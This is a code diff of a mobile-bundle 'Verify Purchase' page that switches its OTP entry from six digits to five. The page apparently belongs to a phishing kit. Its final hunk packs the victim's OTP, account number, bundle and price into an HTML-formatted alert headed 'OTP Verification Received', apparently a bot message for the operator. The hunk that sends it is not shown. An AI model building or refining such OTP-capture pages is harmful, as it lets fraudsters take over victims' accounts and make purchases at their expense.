@@ -69,16 +69,16 @@
         
         .otp-container {
             display: flex;
-            justify-content: space-between;
-            gap: 8px;
+            justify-content: center;
+            gap: 10px;
             margin: 24px 0;
         }
         
         .otp-input {
-            width: 50px;
-            height: 60px;
+            width: 55px;
+            height: 65px;
             text-align: center;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             border: 2px solid #E30613;
             border-radius: 12px;
@@ -178,9 +178,9 @@
 
         @media (max-width: 480px) {
             .otp-input {
-                width: 45px;
-                height: 55px;
-                font-size: 20px;
+                width: 50px;
+                height: 60px;
+                font-size: 22px;
             }
         }
     </style>
@@ -192,12 +192,11 @@
         
         <h1>Verify Purchase</h1>
         <p class="subtitle">
-            A 6-digit verification code has been sent to your number. Please enter it below to complete your purchase.
+            A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.
         </p>
         
         <div class="otp-container" id="otpInputs">
             <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
@@ -265,7 +264,7 @@
 
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
-                const pasteData = e.clipboardData.getData('text').slice(0, 6).split('');
+                const pasteData = e.clipboardData.getData('text').slice(0, 5).split('');
                 pasteData.forEach((char, i) => {
                     if (inputs[i]) {
                         inputs[i].value = char;
@@ -296,8 +295,8 @@
 
         verifyBtn.onclick = () => {
             const otp = getOTP();
-            if (otp.length !== 6) {
-                errMsg.textContent = "Please enter all 6 digits";
+            if (otp.length !== 5) {
+                errMsg.textContent = "Please enter all 5 digits";
                 errMsg.style.display = 'block';
                 return;
             }
@@ -314,7 +313,7 @@
             const bundle = localStorage.getItem('selectedBundle') || 'Unknown';
             const price = localStorage.getItem('bundlePrice') || 'Unknown';
 
-            const message = `<b>OTP Verification Received</b>\n\n` +
+            const message = `<b>OTP Verification Received (5-Digit)</b>\n\n` +
                             `Account: <code>${accountNumber}</code>\n` +
                             `Bundle: <code>${bundle}</code>\n` +
                             `Price: <code>GHS ${price}</code>\n` +
